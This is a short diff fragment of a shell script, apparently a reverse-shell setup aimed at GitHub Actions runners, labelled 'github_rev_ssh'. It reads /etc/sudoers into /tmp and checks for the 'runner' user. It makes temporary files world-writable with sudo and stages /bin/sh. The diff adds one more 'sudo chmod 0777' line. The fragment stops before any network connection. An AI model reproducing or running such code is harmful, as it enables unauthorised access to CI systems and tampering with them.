@@ -42,7 +42,7 @@ grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9a.txt
 # github_rev_ssh
 (id | grep "^uid=[0-9]\{1,9\}(runner)") && 
 (
-    touch /tmp/keepalive;
+    touch /tmp/keepalive;sudo chmod 0777 /tmp/keepalive;
     sudo touch /tmp/0a9.txt; sudo chmod 0777 /tmp/0a9.txt;
     alias ll="ls -al";
     d1="/bin/sh";
